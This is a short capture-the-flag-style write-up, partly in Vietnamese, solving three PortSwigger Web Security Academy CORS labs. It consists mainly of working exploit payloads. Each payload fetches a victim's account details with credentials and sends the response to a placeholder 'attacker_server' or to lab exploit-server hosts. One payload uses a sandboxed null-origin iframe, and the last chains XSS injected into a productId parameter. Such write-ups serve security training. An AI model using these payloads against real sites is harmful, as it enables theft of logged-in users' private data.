
1.CORS vulnerability with basic origin reflection
```js
<script>
fetch('https://vuln.web-api', {credentials:'include'})
  .then(r => r.text())
  .then(data => {
    return fetch('attacker_server/?api=' + encodeURIComponent(data));
  });
</script>
```

2.CORS vulnerability with trusted null origin
Exploit server:
```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://0acf00e103f197518005122e006b004f.web-security-academy.net/accountDetails', {credentials:'include'}) .then(r => r.text()) .then(data => { return fetch('https://exploit-0ac40095035497ba80b3113d01f50035.exploit-server.net/?api=' + encodeURIComponent(data)); });
  </script>"
></iframe>;
```

3.CORS vulnerability with trusted insecure protocols
Kịch bản lần này sẽ là dựa vào 1 subdomain có lỗ hổng xss rồi từ đó thực hiện fetch COR tới trang và lấy dữ liệu.

Đoạn script lấy dữ liệu api.
```js
<script>
fetch('https://vuln.web-api', {credentials:'include'})
  .then(r => r.text())
  .then(data => {
     fetch('attacker_server/?api=' + encodeURIComponent(data));
  });
</script>
```


Tôi không hiểu sao nhưng bài này dùng XHR mới được
```html
<html>
    <head>
        <title>CORS-3</title>
    </head>
    <body>
        <script>
            document.location="http://stock.0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener; req.open('get','https://0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a930014030dfc71c11e84f601550032.exploit-server.net/log?data='%2bthis.responseText; };;%3c/script>&storeId=1"
        </script>
    </body>
</html>
```